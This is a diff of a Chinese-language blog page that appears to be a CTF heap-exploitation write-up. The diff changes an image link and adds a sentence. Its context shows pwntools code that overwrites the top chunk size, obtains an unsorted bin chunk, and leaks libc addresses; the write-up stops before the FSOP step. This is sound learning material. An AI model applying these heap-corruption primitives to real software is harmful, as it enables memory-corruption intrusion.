@@ -235,7 +235,7 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-UXHovCAQ" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
+    <div id="aplayer-XiktaAJx" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
 
 
 
@@ -272,12 +272,12 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xf91</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
 
 <h2><span id="获得unsorted-binleak-libc">获得unsorted bin，leak libc</span></h2><p>​        然后直接申请一个0x1011大小的chunk，就获得了0x1011-0xf91 = 0x80大小的unsorted bin。</p>
-<p>![截屏2022-04-10 下午10.02.34](/Users/rin/Library/Application Support/typora-user-images/截屏2022-04-10 下午10.02.34.png)</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8B%E5%8D%8810.02.34.png" alt="截屏2022-04-10 下午10.02.34"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;malloc_hook =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(malloc_hook)))</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br></pre></td></tr></table></figure>
 
 <p>​        </p>
 <p>​        接下来就是io_file的利用了。</p>
-<h2><span id="fsop">FSOP</span></h2><p>​        由于之前从来咩有做过io_file，所以为了好归纳我就还是再开一篇笔记来专门做io_file的学习笔记吧。</p>
+<h2><span id="fsop">FSOP</span></h2><p>​        由于之前从来咩有做过io_file，所以为了好归纳我就还是再开一篇笔记来专门做io_file的学习笔记吧。等吧fsop看完了再来把这个当做例题看。</p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
